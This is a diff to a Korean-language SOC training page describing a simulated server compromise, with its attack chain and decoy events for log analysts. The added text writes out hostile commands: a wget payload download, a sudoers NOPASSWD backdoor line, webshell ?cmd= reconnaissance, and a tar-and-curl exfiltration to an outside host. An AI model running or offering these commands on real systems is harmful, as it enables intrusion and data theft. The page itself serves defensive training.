@@ -194,6 +194,19 @@
     <div class="sec" id="s2">
       <h2><span class="n">2</span>침해 시나리오</h2>
       <p class="sub">하나의 로그 뭉치에 여러 사건이 섞여 있습니다. 일부는 이어지는 <b>공격 체인</b>, 일부는 판단력을 시험하는 <b>미끼</b>입니다.</p>
+
+      <h3>사건 개요</h3>
+      <p>어느 날 새벽, 외부 인터넷의 <code>198.51.100.23</code> 주소에서 사내 웹서버(Apache)로 <b>SSH 무차별 대입</b>이 시작됩니다.
+      공격자는 <code>root·admin·oracle·postgres</code> 등 흔한 계정을 차례로 시도하다 실패하지만, 결국 <b>웹 운영 계정 <code>webadmin</code></b>의 비밀번호를 알아내 로그인에 성공합니다.
+      침투에 성공한 공격자는 곧바로 <b>웹셸</b>(<code>search.php</code>)을 웹 루트에 심고, 그 웹셸을 통해 서버에 명령을 내려
+      정찰(<code>id·whoami·uname</code>) → <b>악성 페이로드 다운로드</b>(<code>wget</code>) → <b>지속성 확보</b>(cron 등록) → <b>시스템 바이너리 위장</b>(<code>/usr/bin/backup</code>)까지 단계적으로 장악을 넓힙니다.
+      이어 야간에 <code>/etc/sudoers.d</code>에 <b>NOPASSWD 백도어</b>를 심어 언제든 root 권한을 쓸 수 있게 만들고,
+      마지막으로 내부 파일을 <code>tar</code>로 압축해 외부 서버 <code>198.51.100.47</code>로 <b>유출(exfiltration)</b>합니다.
+      최초 침투부터 유출까지 <b>약 40분</b>, 전 과정이 <b>동일한 출발지 IP·계정</b>으로 이어진 하나의 침해 사건입니다.</p>
+      <p>문제는, 같은 시간대의 로그에 이 침해와 <b>무관한 사건 3건</b>이 섞여 있다는 점입니다.
+      취약점 스캐너의 정찰(C), 정상 관리자의 야간 배포 작업(D), 실패만 반복되다 잠긴 로그인 시도(F)는 <b>이상해 보이지만 실제 대응이 필요 없는 미끼</b>입니다.
+      분석가의 임무는 이 뭉치에서 <b>진짜 침해(A·B·E)를 골라내고 미끼를 걸러내는 것</b>입니다.</p>
+
       <div class="tablewrap"><table>
         <tr><th style="width:34px">#</th><th>스토리라인</th><th style="width:70px">성격</th><th style="width:150px">핵심 로그</th></tr>
         <tr><td>A</td><td>SSH 브루트포스 → 웹셸(search.php) → 페이로드 다운로드 → cron 지속성 → /usr/bin/backup 변조</td><td><span class="tag chain">체인</span></td><td>auth · access · audit · cron</td></tr>
@@ -204,19 +217,60 @@
         <tr><td>F</td><td>반복 로그인 실패 후 계정 잠금 — 방어가 작동, 대응 불필요</td><td><span class="tag decoy">미끼</span></td><td>auth</td></tr>
       </table></div>
 
-      <h3>공격 체인 상세 (A → B → E)</h3>
+      <h3>공격 체인 상세 (A → B → E · 동일 공격자 198.51.100.23 / webadmin)</h3>
       <ol class="steps">
-        <li><b>최초 침투 (A1)</b> — 공격자 <code>198.51.100.23</code>가 root·admin·oracle 등으로 다수 로그인 실패 후, <code>webadmin</code> 계정 인증에 성공합니다. auth.log에 "여러 Failed password 후 Accepted password"로 남습니다.</li>
-        <li><b>웹셸 배치 (A2)</b> — /tmp에 만든 <code>search.php</code>를 sudo로 웹 루트(/var/www/html)에 복사합니다. auth.log의 sudo 기록 + auditd 파일변경으로 흔적이 남습니다.</li>
-        <li><b>원격 명령 실행 (A3)</b> — 웹셸에 <code>?cmd=id</code>, <code>?cmd=whoami</code> 처럼 URL 파라미터로 명령을 보냅니다. access.log에 cmd= 요청이, audit에 프로세스 실행이 남습니다.</li>
-        <li><b>페이로드 다운로드 (A4)</b> — 웹셸로 wget을 실행해 악성 파일을 <code>/tmp/.cache/kworker</code>로 내려받습니다.</li>
-        <li><b>지속성 (A5)</b> — crontab에 매분·재부팅 실행을 등록해 재접속 없이도 살아남게 합니다.</li>
-        <li><b>바이너리 변조 (A6)</b> — 시스템 명령처럼 보이는 <code>/usr/bin/backup</code>을 심어둡니다(setuid).</li>
-        <li><b>권한 상승 (B)</b> — 야간에 <code>/etc/sudoers.d/webadmin</code>에 NOPASSWD 백도어를 등록해 상시 root를 확보합니다(동일 공격자).</li>
-        <li><b>정보 유출 (E)</b> — tar로 파일을 압축(<code>/tmp/loot.tgz</code>)한 뒤 curl로 <code>198.51.100.47</code>에 업로드합니다. 체인의 종착점입니다.</li>
+        <li><b>최초 침투 — SSH 무차별 대입 (A1)</b><br>
+          공격자 <code>198.51.100.23</code>가 <code>root·admin·test·oracle·ubuntu·postgres·git</code> 등 흔한 계정으로 짧은 간격에 로그인을 반복 시도합니다.
+          존재하지 않는 계정은 <code>Failed password for invalid user ...</code>, 존재하는 계정은 <code>Failed password for ...</code>로 남다가,
+          마지막에 <code>Accepted password for webadmin from 198.51.100.23</code> — <b>브루트포스가 성공</b>한 순간이자 침해의 기점입니다.
+          <span class="kbd">근거: auth.log</span></li>
+        <li><b>웹셸 배치 (A2)</b><br>
+          공격자는 <code>/tmp/search.php</code>를 만든 뒤 <code>sudo /bin/cp</code>로 웹 루트 <code>/var/www/html/search.php</code>에 복사합니다.
+          평범한 검색 페이지처럼 보이지만, URL 파라미터로 받은 문자열을 서버 명령으로 실행하는 <b>웹셸</b>입니다.
+          auth.log의 sudo 기록과 auditd의 파일 생성(<code>key="webroot_write"</code>)에 흔적이 남습니다.
+          <span class="kbd">근거: auth.log · audit.log</span></li>
+        <li><b>원격 명령 실행 (A3)</b><br>
+          공격자는 <code>GET /search.php?cmd=id</code>, <code>?cmd=whoami</code>, <code>?cmd=uname+-a</code>, <code>?cmd=cat+/etc/passwd</code>, <code>?cmd=ss+-tlnp</code> 순으로
+          서버 권한·계정·네트워크를 <b>정찰</b>합니다. access.log에 <code>cmd=</code> 파라미터가 그대로 노출되고, auditd(<code>key="webshell_exec"</code>)에 실제 프로세스 실행이 교차 기록됩니다.
+          <span class="kbd">근거: access.log · audit.log</span></li>
+        <li><b>페이로드 다운로드 (A4)</b><br>
+          웹셸로 <code>wget http://198.51.100.47/kworker -O /tmp/.cache/kworker</code>를 실행해, 정상 커널 스레드명(<code>kworker</code>)으로 위장한
+          악성 실행파일을 숨은 경로 <code>/tmp/.cache/</code>에 내려받습니다.
+          <span class="kbd">근거: access.log · audit.log</span></li>
+        <li><b>지속성 확보 — cron (A5)</b><br>
+          <code>/etc/cron.d/apache-backup</code>에 <code>* * * * *</code>(매분)와 <code>@reboot</code>로 <code>/tmp/.cache/kworker</code>를 실행하도록 등록합니다.
+          재접속·재부팅 후에도 악성코드가 <b>자동 재실행</b>되어 살아남습니다.
+          <span class="kbd">근거: cron.log · audit.log(key="cron_persist")</span></li>
+        <li><b>시스템 바이너리 위장 (A6)</b><br>
+          <code>/usr/bin/backup</code>이라는 시스템 명령처럼 보이는 파일을 setuid 권한으로 심어둡니다.
+          <code>strings</code>로 열어보면 connect-back 주소(<code>198.51.100.47:4444</code>)·<code>/root/.ssh/authorized_keys</code> 등 흔적이 드러납니다.
+          <span class="kbd">근거: audit.log(key="bin_tamper")</span></li>
+        <li><b>권한 상승 — sudoers 백도어 (B)</b><br>
+          야간에 <code>webadmin ALL=(ALL) NOPASSWD:ALL</code> 한 줄을 <code>/etc/sudoers.d/webadmin</code>에 추가합니다.
+          이제 공격자는 <b>비밀번호 없이 언제든 root</b> 권한을 사용할 수 있습니다. 최초 침투와 동일한 출발지·계정 세션에서 발생합니다.
+          <span class="kbd">근거: auth.log · audit.log(key="priv_esc")</span></li>
+        <li><b>정보 유출 — exfiltration (E)</b><br>
+          <code>tar czf /tmp/loot.tgz /var/www /etc/passwd</code>로 민감 파일을 압축한 뒤,
+          <code>curl -T /tmp/loot.tgz http://198.51.100.47/up</code>으로 외부 서버에 <b>업로드</b>합니다. 공격 체인의 종착점입니다.
+          <span class="kbd">근거: access.log · audit.log</span></li>
       </ol>
-      <div class="note"><b>미끼는 왜 있나</b> — 실무 SOC는 알림·이상 로그가 나와도 "정말 대응이 필요한가"를 판단합니다.
-      C(정찰)·D(정상 관리자)·F(방어 성공)는 흔적이 남아도 대응이 불필요한 사례로, 이를 걸러내는 훈련입니다.</div>
+
+      <h3>미끼(오탐) 상세 — 이상해 보이지만 대응 불필요</h3>
+      <ol class="steps">
+        <li><b>C · 웹 취약점 스캐너 (정찰)</b><br>
+          <code>192.0.2.77</code>에서 <code>sqlmap</code> User-Agent로 <code>/admin.php·/.env·/wp-login.php·/phpmyadmin/</code> 등 없는 경로를 훑어
+          다수 <b>404</b>가 발생하고, 방화벽(UFW)이 여러 포트 스캔을 차단합니다.
+          → <b>탐지는 되지만</b>(rule 100102) 성공 응답·후속 행위가 없어 실제 침해로 이어지지 않은 <b>정찰</b>입니다. 저위험 모니터링 대상.</li>
+        <li><b>D · 정상 관리자의 야간 배포 (정상 업무)</b><br>
+          사내 LAN <code>192.168.208.50</code>의 관리자 <code>opsadmin</code>이 로그인 후 <code>/etc/cron.d/deploy-nightly</code>에 정기 배포 스크립트를 등록합니다.
+          A의 cron 지속성과 <b>모양은 비슷</b>하지만, 계정·출발지·작업 목적이 정상 업무와 일치합니다. 공격자 IP와 무관 → 대응 불필요.</li>
+        <li><b>F · 반복 로그인 실패 후 계정 잠금 (방어 성공)</b><br>
+          <code>198.51.100.99</code>에서 root 로그인을 6회 연속 실패하자 <code>pam_faillock</code>이 계정을 <b>잠급니다</b>.
+          <b>성공한 인증이 하나도 없어</b> 방어가 정상 작동한 사례입니다. 대응 불필요.</li>
+      </ol>
+      <div class="tip"><b>핵심 관점</b> — 알림·이상 로그의 '유무'가 아니라 <b>'조사 후 대응이 필요한가'</b>로 판단합니다.
+      진짜 침해(A·B·E)는 <b>성공 응답 + 후속 행위 + 동일 공격자로 이어지는 체인</b>이 특징이고,
+      미끼(C·D·F)는 정찰·정상업무·방어성공이라 흔적이 남아도 대응이 필요 없습니다.</div>
     </div>
 
     <!-- 3. 로그 소스 -->
